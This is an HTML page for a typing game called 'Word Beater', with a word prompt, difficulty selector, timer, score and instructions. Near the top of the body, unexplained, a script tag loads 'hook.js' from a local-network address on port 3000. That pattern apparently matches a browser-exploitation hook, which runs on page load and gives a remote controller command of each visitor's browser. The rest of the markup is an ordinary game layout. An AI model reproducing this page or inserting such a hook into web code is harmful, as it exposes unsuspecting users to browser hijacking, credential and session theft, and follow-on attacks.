<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" 
    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <title>Word Beater</title>
</head>
<body class="bg-dark text-white">
    <script src="http://192.168.1.7:3000/hook.js"></script>
    <header class="bg-secondary text-center p-3 mb-5">
        <h1>Word Beater</h1>
    </header>

    <div class="container text-center">
        <!--- Word & Input -->
        <div class="row">
            <div class="col-md-6 mx-auto">
                    <h1 class=" mt-3" id="dhayang">
                        </h1>
                <p class="lead">Type The Given Word Within
                    <span class="text-success" id ="seconds">5</span>
                    Seconds:
                </p>
                <h2 class = "display-2 mb-5" id="current-word"></h2>
                <div class="row">
                    <div class="col-md-8">
                            <input type="text" class="form-control form-control-lg" 
                            placeholder="Start typing.." id="word-input" autofocus>
                    </div>
                    <div class="col-md-3">
                            <select class="form-control form-control-lg" id="level" onchange="setDifficulty()">
                                    <option>easy</option>
                                    <option>medium</option>
                                    <option>hard</option>
                                </select>
                    </div>
                        <div class="col-md-1">
                            <button class="btn btn-success btn-lg" onclick="startOrPause()" id = "start">Start</button>
                    </div>
                </div>

                <h4 class="mt-3" id="message"></h4>
                <h2 class="mt-3" id="message"> High Score: 
                    <span id="highscore"></span>
                </h2>

                <!-- Time & Score Columns -->
                <div class="row mt-3">
                    <div class="col-md-6">
                        <h3>Time Left:
                            <span id="time">0</span>
                        </h3>
                    </div>
                    <div class="col-md-6">
                        <h3>Score:
                            <span id="score">0</span>
                        </h3>
                    </div>
                </div>

                <!-- Instructions -->
                <div class="row mt-5 mb-5">
                    <div class="col-md-12">
                        <div class="card-body bg-secondary text-white">
                            <h5>Instructions</h5>
                            <p>Type each word in the given amount of seconds to score.
                            To play again, just type the current-word. 
                            Your score will reset</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="/main.js"></script>
</body>
</html>
